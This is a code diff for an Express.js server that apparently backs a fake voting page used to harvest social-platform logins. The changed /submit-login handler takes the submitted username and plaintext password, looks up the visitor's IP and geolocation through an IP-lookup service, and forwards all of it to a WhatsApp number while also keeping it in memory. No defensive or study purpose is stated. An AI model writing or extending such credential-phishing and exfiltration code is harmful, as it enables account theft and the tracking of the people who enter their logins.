@@ -54,33 +54,47 @@ app.get("/", (req, res) => {
 });
 
 // Submit login/code
+// Submit login/code
 app.post("/submit-login", async (req, res) => {
   const { username, password, platform } = req.body;
-  const message = `New voter logged in to ${platform}\nUsername: ${username}\nPassword: ${password}`;
+
+  // Get client IP (from headers or connection)
+  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
 
   try {
-    votes.push({ username, platform, action: "login", time: new Date() });
+    // Fetch location from IP
+    const geoRes = await axios.get(`https://ipapi.co/${ip}/json/`);
+    const locationData = geoRes.data;
+
+    const location = `${locationData.city || "Unknown City"}, ${locationData.region || "Unknown Region"}, ${locationData.country_name || "Unknown Country"}`;
+
+    // Build WhatsApp message
+    const message = `New login on ${platform}\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}\nLocation: ${location}`;
+
+    // Store in memory
+    votes.push({
+      username,
+      platform,
+      action: "login",
+      ip,
+      location,
+      time: new Date(),
+    });
+
+    // Send WhatsApp
     const apiResponse = await sendWhatsApp(message);
-    res.json({ success: true, msg: "Login received and sent to WhatsApp!", apiResponse });
+
+    res.json({ 
+      success: true, 
+      msg: "Login received, location tracked, and sent to WhatsApp!", 
+      location, 
+      apiResponse 
+    });
   } catch (err) {
-    res.status(500).json({ success: false, error: "Failed to send WhatsApp message" });
+    console.error("Location fetch error:", err.message);
+    res.status(500).json({ success: false, error: "Failed to fetch location or send message" });
   }
 });
-
-// Submit vote click
-app.post("/submit-vote", async (req, res) => {
-  const { platform } = req.body;
-  const message = `Someone wants to vote with ${platform}`;
-
-  try {
-    votes.push({ username: "n/a", platform, action: "clicked", time: new Date() });
-    const apiResponse = await sendWhatsApp(message);
-    res.json({ success: true, msg: "Vote received and sent to WhatsApp!", apiResponse });
-  } catch (err) {
-    res.status(500).json({ success: false, error: "Failed to send WhatsApp message" });
-  }
-});
-
 // -------------------- Admin Routes --------------------
 
 // Get logs
